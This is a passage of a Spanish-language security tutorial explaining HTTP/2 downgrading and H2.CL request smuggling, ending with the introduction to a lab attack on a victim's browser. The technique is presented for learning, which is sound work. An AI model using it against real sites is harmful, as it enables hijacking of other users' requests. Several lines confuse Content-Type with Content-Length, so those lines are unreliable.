+<p>En teoría, <strong>este mecanismo significa que no hay posibilidad de que un atacante introduzca la ambigüedad necesaria para el contrabando de solicitudes, siempre que el sitio web utilice HTTP/2 de extremo a extremo. Sin embargo, en la naturaleza, este no suele ser el caso debido a la práctica generalizada pero peligrosa de degradar HTTP/2</strong>.</p>
+
+<p><br /></p>
+
+<h4 id="63-http2-downgrading">6.3. HTTP/2 Downgrading.</h4>
+
+<p>La degradación de HTTP/2 es el proceso de reescribir solicitudes HTTP/2 utilizando la sintaxis HTTP/1 para generar una solicitud HTTP/1 equivalente. Los servidores web y los proxies inversos a menudo hacen esto para ofrecer soporte HTTP/2 a los clientes mientras se comunican con servidores back-end que solo interpretan HTTP/1. <strong>Esta práctica es un requisito previo para muchos de los ataques cubiertos en esta sección</strong>.</p>
+
+<p>Es decir, aunque HTTP/2 sea robusto, el degradado de HTTP/2 a HTTP/1 expone HTTP2 a las vulnerabilidades que tenía HTTP/1.</p>
+
+<p><br /></p>
+
+<h4 id="64-vulnerabilidades">6.4. Vulnerabilidades.</h4>
+
+<h5 id="641-vulnerabilidades-h2cl">6.4.1. Vulnerabilidades H2.CL.</h5>
+
+<p>Este se basa en introducir una cabecera Content-Type engañosa.</p>
+
+<p>Las HTTP/2 no suelen llevar una cabecera Content-Type y cuando lo hacen al degredar la request a HTTP/1 se copia el valor que esta tiene. De otro modo simplemente se adhiere a la request degradada una cabecera Content-Type cuyo valor coincide con el número de bytes de la request calculada mediante el mecanismo de longitud integrado de HTTP/2 ya mencionado anteriormente.</p>
+
+<p>En cualquier caso, <strong>la especificación dicta que cualquier  header content-length de una solicitud HTTP/2 debe coincidir con la longitud calculada mediante el mecanismo incorporado, pero esto no siempre se valida correctamente antes de degradar</strong>. Como resultado, es posible pasar de contrabando solicitudes mediante la inserción de un content-length encabezado engañoso. </p>
+
+<p>Así:</p>
+
+<ul>
+  <li>
+    <p>aunque el front-end utilizará la longitud implícita de HTTP/2 para determinar dónde termina la solicitud.</p>
+  </li>
+  <li>
+    <p>el back-end de HTTP/1 tiene que hacer referencia al Content-Length encabezado derivado del que inyectó.</p>
+  </li>
+</ul>
+
+<p>Esto resulta en una desincronización similar a la que obteníamos con las cabeceras Content-Type y Transfer-Encoding.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220625113411.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<p><strong>Laboratorio 6: H2.CL request smugling</strong></p>
+
+<p>Este laboratorio es vulnerable a Request Smuggling porque el servidor front-end degrada de HTTP/2 a HTTP/1 al comunicarse con el servidor del back-end.</p>
+
+<p>Para resolver este laboratorio vamos a realizar un ataque de Request Smuggling en el navegador de la víctima.</p>
+
